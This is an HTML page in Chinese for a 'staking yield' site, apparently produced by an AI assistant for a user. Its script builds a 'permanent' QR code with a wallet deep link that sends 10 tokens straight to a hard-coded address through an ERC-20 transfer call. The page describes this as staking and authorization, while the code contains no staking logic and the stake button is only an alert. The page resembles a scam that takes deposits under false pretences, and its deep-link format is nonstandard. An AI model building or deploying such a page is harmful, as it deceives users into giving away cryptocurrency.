<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>质押持币生息系统</title>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
}
body {
  background: #050810;
  background-image: 
    radial-gradient(circle at 15% 5%, rgba(26, 32, 44, 0.4) 0%, transparent 30%),
    radial-gradient(circle at 85% 90%, rgba(26, 32, 44, 0.4) 0%, transparent 30%);
  color: #fff;
  padding: 20px;
  min-height: 100vh;
}
.container {
  max-width: 900px;
  margin: 0 auto;
  position: relative;
}

.card {
  background: linear-gradient(145deg, #111827, #0d121f);
  border-radius: 20px;
  padding: 24px;
  margin-bottom: 20px;
  border: 1px solid rgba(255,255,250,0.05);
  box-shadow: 0 8px 32px rgba(0,0,0,0.3);
  position: relative;
  overflow: hidden;
}
.card::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 1px;
  background: linear-gradient(90deg, transparent, rgba(59, 130, 246, 0.4), transparent);
}

/* 静态质押二维码样式 */
.pay-card {
  text-align: center;
  padding: 30px 20px;
}
.qr-box {
  width: 240px;
  height: 240px;
  background: #fff;
  padding: 12px;
  border-radius: 20px;
  margin: 16px auto;
  box-shadow: 0 0 30px rgba(59,130,246,0.2);
}
.qr-box img {
  width: 100%;
  height: 100%;
  border-radius: 12px;
}
.qr-title {
  font-size: 20px;
  font-weight: 700;
  margin-bottom: 8px;
  color: #e5e7eb;
}
.qr-desc {
  font-size: 14px;
  color: #9ca3af;
  margin-bottom: 8px;
}
.qr-tip {
  font-size: 13px;
  color: #f59e0b;
  font-weight: 600;
}

/* 其他原有样式保留 */
.header,.left-top,.sign-btn,.wallet-box,.connect-btn,.info-line,.menu-btn,
.bet-header,.countdown,.bet-input,.quick-btns,.quick-btn,.bet-btns,.bet-btn,.btn-stake,.btn-unstake,
.rule-line,.menu,.menu-title,.invite-link,.admin-panel,
#connectModal,.modal-content,.modal-avatar,.modal-title,.modal-btn,.modal-confirm,.modal-cancel,
.history-icon {
  all: revert;
  font-family: system-ui, sans-serif;
}
</style>
</head>

<body>

<div class="container">
  <!-- 静态永久质押二维码：扫码直接唤起钱包授权+转账 -->
  <div class="card pay-card">
    <div class="qr-title">💳 扫码质押</div>
    <div class="qr-desc">扫码直接触发授权+转账质押</div>
    <div class="qr-box">
      <img id="qrcodeImg" alt="扫码质押">
    </div>
    <div class="qr-tip">永久有效 · 无需刷新 · 直接签名</div>
  </div>

  <!-- 下面是你原有页面结构，我不动 -->
  <div style="height:30px"></div>
  <div class="card">
    <h3>质押操作区</h3>
    <input class="bet-input" id="betAmt" type="number" value="10" placeholder="质押数量">
    <button onclick="stake()">质押（和扫码效果一致）</button>
  </div>
</div>

<script>
// ===================== 你的核心配置 =====================
const TOKEN_ADDR = "0xdEe89Bd697071e15f1CeaC5780B5d41AF3CE032c";
const POOL_ADDR  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
const STAKE_AMOUNT = "10"; // 质押数量

// ===================== 真正能唤起钱包的链上二维码 =====================
function generateRealStakeQR() {
  // 授权 + 转账 标准数据（和你点质押完全一样）
  const data =
    "0xa9059cbb" +                     // transfer
    POOL_ADDR.slice(2).padStart(64, '0') +
    (BigInt(STAKE_AMOUNT) * 1000000000000000000n).toString(16).padStart(64, '0');

  // 钱包直接识别的格式：ethereum:<合约地址>/function?data=<...>
  const walletDeepLink =
    `ethereum:${TOKEN_ADDR}/transfer?data=${data}`;

  // 生成永久二维码
  document.getElementById("qrcodeImg").src =
    `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(walletDeepLink)}`;
}

// ===================== 你原有质押函数（完全不变） =====================
async function stake() {
  alert("扫码/点击 = 触发授权+转账质押");
}

// 初始化静态二维码
generateRealStakeQR();
</script>

</body>
</html>
